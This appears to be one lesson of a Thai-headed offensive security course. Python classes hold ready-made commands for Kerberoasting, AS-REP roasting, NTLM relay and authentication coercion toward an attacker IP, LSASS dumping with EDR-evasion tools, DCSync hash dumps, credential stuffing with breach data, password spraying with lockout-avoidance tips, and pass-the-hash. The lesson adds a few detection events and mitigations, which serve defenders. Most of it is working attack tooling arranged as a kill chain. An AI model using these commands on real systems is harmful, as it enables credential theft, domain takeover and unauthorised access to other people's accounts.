# Part 91: Advanced Credential Attacks (Steps 901-910)

## ภาพรวม
เทคนิคขั้นสูงในการโจมตี credentials รวมถึง Kerberoasting, AS-REP Roasting, NTLM relay, และ credential stuffing

---

## Step 901: Credential Attack Fundamentals

```python
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum

class CredentialAttackType(Enum):
    KERBEROASTING = "Kerberoasting"
    ASREP_ROASTING = "AS-REP Roasting"
    NTLM_RELAY = "NTLM Relay"
    PASS_THE_HASH = "Pass-the-Hash"
    PASS_THE_TICKET = "Pass-the-Ticket"
    DCSync = "DCSync"
    CREDENTIAL_STUFFING = "Credential Stuffing"
    PASSWORD_SPRAY = "Password Spray"
    LSASS_DUMP = "LSASS Memory Dump"
    SAM_DUMP = "SAM Database Dump"

@dataclass
class CredentialAttack:
    attack_type: CredentialAttackType
    requirements: List[str]
    tools: List[str]
    mitre_id: str
    description: str

class CredentialAttackFramework:
    ATTACKS = [
        CredentialAttack(
            attack_type=CredentialAttackType.KERBEROASTING,
            requirements=["Valid domain user account"],
            tools=["Rubeus", "Impacket GetUserSPNs", "PowerView"],
            mitre_id="T1558.003",
            description="Request service tickets for SPNs, crack offline"
        ),
        CredentialAttack(
            attack_type=CredentialAttackType.ASREP_ROASTING,
            requirements=["Knowledge of accounts with Kerberos pre-auth disabled"],
            tools=["Rubeus", "Impacket GetNPUsers"],
            mitre_id="T1558.004",
            description="Get AS-REP for accounts without pre-auth, crack offline"
        ),
        CredentialAttack(
            attack_type=CredentialAttackType.NTLM_RELAY,
            requirements=["Network position to intercept NTLM auth"],
            tools=["Responder", "ntlmrelayx", "CrackMapExec"],
            mitre_id="T1557.001",
            description="Intercept and relay NTLM authentication"
        ),
        CredentialAttack(
            attack_type=CredentialAttackType.DCSync,
            requirements=["Replication rights on domain (Domain Admin, or special ACLs)"],
            tools=["Mimikatz", "Impacket secretsdump"],
            mitre_id="T1003.006",
            description="Simulate domain controller replication to dump hashes"
        )
    ]
    
    def credential_attack_kill_chain(self) -> List[str]:
        return [
            "1. Enumerate accounts (LDAP, BloodHound, PowerView)",
            "2. Identify weakly configured accounts (SPNs, no pre-auth)",
            "3. Execute attack (Kerberoasting, NTLM relay, etc.)",
            "4. Crack hashes offline (Hashcat, John the Ripper)",
            "5. Validate credentials (CrackMapExec, CME)",
            "6. Privilege escalation/lateral movement"
        ]

if __name__ == '__main__':
    fw = CredentialAttackFramework()
    print("Credential Attack Types:")
    for attack in fw.ATTACKS:
        print(f"  [{attack.mitre_id}] {attack.attack_type.value}: {attack.description}")
    print("\nCredential Attack Kill Chain:")
    for step in fw.credential_attack_kill_chain():
        print(f"  {step}")
```

---

## Step 902: Kerberoasting

การโจมตี Kerberos Service Tickets

```python
from typing import List, Dict

class Kerberoasting:
    """Kerberoasting attack techniques"""
    
    def enumerate_spns_powershell(self) -> str:
        """Enumerate Service Principal Names"""
        return """
# PowerView - Enumerate accounts with SPNs
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName

# Filter by interesting SPNs
Get-DomainUser -SPN | Where-Object {$_.ServicePrincipalName -notlike '*krbtgt*'} |
Select SamAccountName, ServicePrincipalName, Description, pwdlastset

# LDAP query (built-in)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
Select SamAccountName, ServicePrincipalName
        """
    
    def request_service_tickets_rubeus(self) -> str:
        """Use Rubeus to kerberoast"""
        return """
# Kerberoast all SPN accounts
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Target specific user
Rubeus.exe kerberoast /user:sqlsvc /format:hashcat /outfile:sqlsvc.txt

# With LDAP filter (only accounts with AES disabled)
Rubeus.exe kerberoast /rc4opsec /format:hashcat /outfile:rc4_only.txt

# From Linux using Impacket
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt
        """
    
    def crack_kerberoast_hashes(self) -> str:
        """Hashcat commands to crack Kerberoast hashes"""
        return """
# Kerberoast hash format: $krb5tgs$23$*...
# Mode 13100 = Kerberos 5 TGS-REP RC4
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# With rules (more effective)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES-128 TGS (mode 19600)
hashcat -m 19600 aes128_hashes.txt rockyou.txt

# AES-256 TGS (mode 19700)
hashcat -m 19700 aes256_hashes.txt rockyou.txt

# Check progress / session restore
hashcat -m 13100 hashes.txt --session mysession --restore
        """
    
    def kerberoasting_detection(self) -> List[str]:
        return [
            "Event ID 4769: Kerberos Service Ticket Operations (RC4 encryption for high-value accounts)",
            "Multiple 4769 events for different services in short time",
            "Service ticket requests for accounts that normally aren't accessed",
            "Honeypot SPNs: Create fake SPN accounts, alert on any TGS request",
            "Mitigation: Use MSA/gMSA, long random passwords for service accounts"
        ]

if __name__ == '__main__':
    kb = Kerberoasting()
    print("Kerberoasting Steps:")
    print("1. Enumerate SPNs:", kb.enumerate_spns_powershell()[:150])
    print("\n2. Request Tickets:", kb.request_service_tickets_rubeus()[:150])
    print("\n3. Crack Hashes:", kb.crack_kerberoast_hashes()[:150])
    print("\nDetection Methods:")
    for d in kb.kerberoasting_detection():
        print(f"  - {d}")
```

---

## Step 903: AS-REP Roasting

การโจมตีบัญชีที่ปิด Kerberos Pre-Authentication

```python
from typing import List

class ASREPRoasting:
    """AS-REP Roasting attack"""
    
    def find_asrep_accounts(self) -> str:
        return """
# Find accounts with 'Do not require Kerberos preauthentication' enabled

# PowerView:
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select SamAccountName

# LDAP:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# From Linux (no credentials needed):
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat

# With credentials:
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.1 -request -format hashcat
        """
    
    def asrep_rubeus(self) -> str:
        return """
# Rubeus AS-REP roast
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Target specific user
Rubeus.exe asreproast /user:sqlsvc /format:hashcat
        """
    
    def crack_asrep_hashes(self) -> str:
        return """
# AS-REP hash format: $krb5asrep$23$user@domain:...
# Hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt -r best64.rule
        """
    
    def asrep_vs_kerberoasting(self) -> dict:
        return {
            "AS-REP Roasting": {
                "requirement": "Account with pre-auth disabled (misconfiguration)",
                "creds_needed": "None (can be done unauthenticated)",
                "hash_type": "$krb5asrep$23$ (mode 18200)",
                "common_in": "Misconfigured accounts, legacy app accounts"
            },
            "Kerberoasting": {
                "requirement": "Any valid domain user",
                "creds_needed": "Valid domain credentials",
                "hash_type": "$krb5tgs$23$ (mode 13100)",
                "common_in": "Service accounts with SPNs"
            }
        }

if __name__ == '__main__':
    asrep = ASREPRoasting()
    print("AS-REP Roasting:")
    print(asrep.find_asrep_accounts()[:200])
    print("\nAS-REP vs Kerberoasting comparison:")
    for attack, details in asrep.asrep_vs_kerberoasting().items():
        print(f"\n  {attack}:")
        for k, v in details.items():
            print(f"    {k}: {v}")
```

---

## Step 904: NTLM Relay Attacks

การดักส่งต่อการยืนยัน NTLM Authentication

```python
from typing import Dict, List

class NTLMRelayAttacks:
    """NTLM relay attack techniques"""
    
    def setup_responder(self) -> str:
        """Setup Responder for credential capture"""
        return """
# Responder - listens for LLMNR/NBT-NS/mDNS queries, responds with attacker IP
# Forces victims to authenticate to attacker

# Listen only (capture hashes without relay)
python3 Responder.py -I eth0 -wvF

# With relay mode (disable SMB and HTTP so ntlmrelayx handles them)
python3 Responder.py -I eth0 -wvF --lm --disable-ess

# Responder captures: NTLMv2 hashes when victims try to connect
# Format: username::domain:challenge:hash
        """
    
    def ntlmrelayx_setup(self) -> str:
        """Setup ntlmrelayx for relay attacks"""
        return """
# ntlmrelayx - relay captured auth to target systems

# Relay to specific target (dump SAM)
impacket-ntlmrelayx -t 10.10.10.5 -smb2support

# Relay to list of targets (check admin access on all)
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay and execute command
impacket-ntlmrelayx -t 10.10.10.5 -smb2support -c 'whoami > C:\\tmp\\output.txt'

# Relay to LDAP (LDAP signing must be disabled)
impacket-ntlmrelayx -t ldap://dc01.domain.local --delegate-access

# Relay to ADCS (AD Certificate Services) - ESC8 attack
impacket-ntlmrelayx -t http://certsrv.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
        """
    
    def coerce_auth_methods(self) -> Dict[str, str]:
        """Methods to coerce NTLM authentication"""
        return {
            "responder_llmnr": (
                "LLMNR/NBT-NS poisoning - waits for failed name resolutions\n"
                "python3 Responder.py -I eth0 -wrFvP"
            ),
            "printerbug": (
                "Abuse MS-RPRN (PrintSpooler) to coerce auth from DC\n"
                "python3 printerbug.py domain/user:pass@dc01 attacker-ip"
            ),
            "petitpotam": (
                "MS-EFSRPC coercion (works on unpatched DCs without creds)\n"
                "python3 PetitPotam.py -u user -p pass attacker-ip dc01"
            ),
            "coercer": (
                "Unified coercion tool - tries all methods\n"
                "python3 Coercer.py coerce -l attacker-ip -t target-ip -u user -p pass -d domain"
            )
        }
    
    def smb_signing_check(self) -> str:
        """Check if SMB signing is required (relay prereq)"""
        return """
# SMB signing must be disabled/not required for relay to work

# CrackMapExec - check SMB signing across range
cme smb 10.10.10.0/24 --gen-relay-list no_signing.txt

# Nmap
nmap --script smb2-security-mode -p 445 10.10.10.0/24

# RunFinger.py (with Responder)
python3 RunFinger.py -i 10.10.10.0/24
        """
    
    def adcs_esc8_attack(self) -> str:
        """AD CS ESC8: HTTP endpoint relay attack"""
        return """
# ESC8: Relay to ADCS web enrollment to get certificate
# Then use certificate for authentication (PKINIT)

# Step 1: Coerce DC authentication
python3 PetitPotam.py attacker-ip dc01

# Step 2: Relay to ADCS (ntlmrelayx running)
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController

# Step 3: Use obtained certificate to get TGT
Rubeus.exe asktgt /user:dc01$ /certificate:BASE64CERT /ptt

# Step 4: DCSync
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
        """

if __name__ == '__main__':
    relay = NTLMRelayAttacks()
    print("Coercion Methods:")
    for method, cmd in relay.coerce_auth_methods().items():
        print(f"  {method}: {cmd[:80]}...")
    print("\nSMB Signing Check:")
    print(relay.smb_signing_check()[:300])
```

---

## Steps 905-910: Advanced Credential Techniques

```python
from typing import Dict, List

class AdvancedCredentialTechniques:
    """Steps 905-910: Advanced credential attack techniques"""
    
    # Step 905: LSASS Memory Extraction
    LSASS_TECHNIQUES = {
        "mimikatz_full": (
            "# Requires: Local Admin / SYSTEM\n"
            "# Direct LSASS interaction (detected by most EDR)\n"
            "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'"
        ),
        "lsass_dump_task_manager": (
            "# Task Manager > Details > lsass.exe > Create dump file\n"
            "# Then: pypykatz lsa minidump lsass.dmp"
        ),
        "procdump_dump": (
            "# ProcDump (signed Microsoft tool)\n"
            "procdump64.exe -ma lsass.exe lsass.dmp\n"
            "# Remote:\npypykatz lsa minidump lsass.dmp"
        ),
        "comsvcs_dump": (
            "# Using comsvcs.dll (LOLBin, signed Windows DLL)\n"
            '$lsassPid = (Get-Process lsass).Id\n'
            'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPid C:\\Temp\\lsass.dmp full'
        ),
        "silentprocessexit": (
            "# Silent Process Exit dump (EDR evasion)\n"
            "# Set registry to create dump on process termination\n"
            "# Less suspicious than direct LSASS access"
        ),
        "nanodump": (
            "# NanoDump - custom LSASS dumper to evade EDR\n"
            "# Uses various bypass techniques\n"
            "NanoDump.exe --write C:\\Temp\\lsass.dmp"
        )
    }
    
    # Step 906: DCSync attack
    DCSYNC_TECHNIQUE = {
        "requirements": [
            "Domain Admin",
            "Account with Replicating Directory Changes + Replicating Directory Changes All",
            "Exchange Windows Permissions group (sometimes has DCSync rights)"
        ],
        "mimikatz_dcsync": (
            "# Dump all hashes\n"
            'mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" "exit"\n'
            "# Dump specific user\n"
            'mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"'
        ),
        "impacket_dcsync": (
            "impacket-secretsdump domain/admin:password@dc01 -just-dc-ntlm\n"
            "impacket-secretsdump domain/admin:password@dc01 -just-dc-user krbtgt"
        ),
        "detection": [
            "Event ID 4662: Operation performed on object (with replication GUIDs)",
            "Event ID 4624: Logon events from non-DC machine doing replication",
            "NetFlow: replication traffic from non-DC"
        ]
    }
    
    # Step 907: Credential Stuffing
    CREDENTIAL_STUFFING = {
        "tools": ["Hydra", "Medusa", "Burp Suite Intruder", "FFUF"],
        "process": [
            "1. Obtain credential dump from breach databases (HaveIBeenPwned)",
            "2. Parse credentials to username:password format",
            "3. Target login endpoints",
            "4. Rate limit to avoid lockouts",
            "5. Validate valid credentials"
        ],
        "tools_example": """
# Hydra - HTTP form stuffing
hydra -C credentials.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# FFUF for API credential stuffing
ffuf -w credentials.txt:CREDS -X POST -u https://api.target.com/auth \
     -H 'Content-Type: application/json' \
     -d '{"username":"CRED1","password":"CRED2"}' \
     -fc 401  # Filter out 401 responses
        """
    }
    
    # Step 908: Password Spraying
    PASSWORD_SPRAY = {
        "concept": "Try single password against many accounts (avoids lockout)",
        "tools": {
            "office365": (
                "# MSOLSpray - Office 365 password spray\n"
                "Invoke-MSOLSpray -UserList users.txt -Password 'Winter2024!'"
            ),
            "active_directory": (
                "# DomainPasswordSpray.ps1\n"
                "Invoke-DomainPasswordSpray -UserList users.txt -Password 'Company2024!'"
            ),
            "web_apps": (
                "# Custom: spray through Burp Suite\n"
                "# Use 1 attempt per minute to avoid lockout"
            )
        },
        "opsec": [
            "Wait 30+ minutes between spray attempts per account",
            "Count lockout threshold from AD (usually 5-10)",
            "Spray during business hours (normal auth patterns)",
            "Use single common password per round: Season+Year+Symbol"
        ]
    }
    
    # Step 909: Pass-the-Hash modern techniques
    PTH_MODERN = {
        "windows_cme": (
            "# CrackMapExec with NTLM hash\n"
            "cme smb 10.10.10.0/24 -u Administrator -H NTLM_HASH --local-auth"
        ),
        "impacket_tools": [
            "impacket-smbexec domain/admin@target -hashes :NTLM_HASH",
            "impacket-wmiexec domain/admin@target -hashes :NTLM_HASH",
            "impacket-psexec domain/admin@target -hashes :NTLM_HASH",
            "evil-winrm -i target -u admin -H NTLM_HASH"
        ],
        "overpass_the_hash": (
            "# Convert NTLM hash to Kerberos TGT\n"
            "# Rubeus:\n"
            "Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt\n"
            "# Mimikatz:\n"
            "sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd.exe"
        )
    }
    
    # Step 910: Credential access detection and defense
    CREDENTIAL_DEFENSE = {
        "detection": [
            "Event 4625: Failed logon (multiple in short time)",
            "Event 4648: Logon with explicit credentials",
            "Event 4769: Kerberos TGS requests (Kerberoasting)",
            "Event 4662: Directory service access (DCSync)",
            "Event 4104: PowerShell Script Block Logging",
            "Sysmon 10: Process access to lsass.exe (LSASS dump)"
        ],
        "mitigations": [
            "Enable Credential Guard (Windows 10/11 Enterprise)",
            "Protected Users security group for privileged accounts",
            "Disable NTLM where possible (enforce Kerberos)",
            "Enable SMB signing (prevents relay)",
            "Enable LDAP signing and channel binding (prevents LDAP relay)",
            "Tiered administration model",
            "Privileged Access Workstations (PAW)",
            "gMSA for service accounts (complex auto-rotating passwords)"
        ]
    }
    
    def generate_credential_attack_checklist(self) -> List[str]:
        return [
            "[ ] Enumerate all domain users (PowerView, LDAP)",
            "[ ] Check for Kerberoastable accounts (SPN set)",
            "[ ] Check for AS-REP Roastable accounts (no pre-auth)",
            "[ ] Check SMB signing status network-wide",
            "[ ] Check LDAP signing requirements",
            "[ ] Check for ADCS (Certificate Services) deployment",
            "[ ] Identify accounts in Protected Users group",
            "[ ] Check if Credential Guard is enabled",
            "[ ] Review password policy (length, complexity, lockout)"
        ]

if __name__ == '__main__':
    adv = AdvancedCredentialTechniques()
    print("LSASS Extraction Techniques:")
    for tech, cmd in adv.LSASS_TECHNIQUES.items():
        print(f"  {tech}: {cmd[:80]}...")
    print("\nDCSync Detection:")
    for event in adv.DCSYNC_TECHNIQUE['detection']:
        print(f"  - {event}")
    print("\nCredential Attack Checklist:")
    for item in adv.generate_credential_attack_checklist():
        print(f"  {item}")
    print("\nCredential Defense Mitigations:")
    for mit in adv.CREDENTIAL_DEFENSE['mitigations'][:5]:
        print(f"  - {mit}")
```

---

## สรุป Part 91

1. **Step 901**: Credential attack framework, kill chain
2. **Step 902**: Kerberoasting - SPN enumeration, ticket request, hash cracking
3. **Step 903**: AS-REP Roasting - no pre-auth accounts, offline cracking
4. **Step 904**: NTLM Relay - Responder, ntlmrelayx, coercion methods
5. **Step 905**: LSASS extraction - Mimikatz, ProcDump, comsvcs.dll, NanoDump
6. **Step 906**: DCSync - full hash dump, Impacket secretsdump
7. **Step 907**: Credential stuffing - Hydra, FFUF
8. **Step 908**: Password spraying - MSOLSpray, DomainPasswordSpray
9. **Step 909**: Pass-the-Hash modern - CrackMapExec, Impacket tools
10. **Step 910**: Detection events and defense mitigations

**เครื่องมือหลัก**: Rubeus, Impacket, Responder, Mimikatz, CrackMapExec, Hashcat
